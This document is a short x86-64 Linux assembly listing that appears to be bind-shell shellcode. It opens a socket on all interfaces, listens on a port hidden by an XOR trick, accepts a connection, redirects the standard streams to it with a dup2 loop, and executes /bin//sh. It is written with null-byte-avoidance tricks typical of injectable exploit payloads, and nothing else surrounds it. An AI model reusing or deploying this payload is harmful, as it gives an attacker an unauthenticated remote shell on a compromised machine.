        .intel_syntax noprefix
        .globl _start
_start:
        push 41
        pop rax
        cdq
        push 2
        pop rdi
        push 1
        pop rsi
        syscall                 # socket
        xchg rdi, rax
        mov edx, 0x8813fff2
        xor dx, 0xfff0
        push rdx
        mov rsi, rsp
        push 16
        pop rdx
        push 49
        pop rax
        syscall                 # bind
        push 50
        pop rax
        syscall                 # listen
        xor rsi, rsi
        push 43
        pop rax
        syscall                 # accept
dup:
        xchg rdi, rax
        push 3
        pop rsi
dup_loop:
        dec rsi
        push 33
        pop rax
        syscall
        jne dup_loop
exec_shell:
        push 59
        pop rax
        cdq
        push rdx
        movabs rbx, 0x68732f2f6e69622f
        push rbx
        mov rdi, rsp
        push rdx
        push rdi
        mov rsi, rsp
        syscall
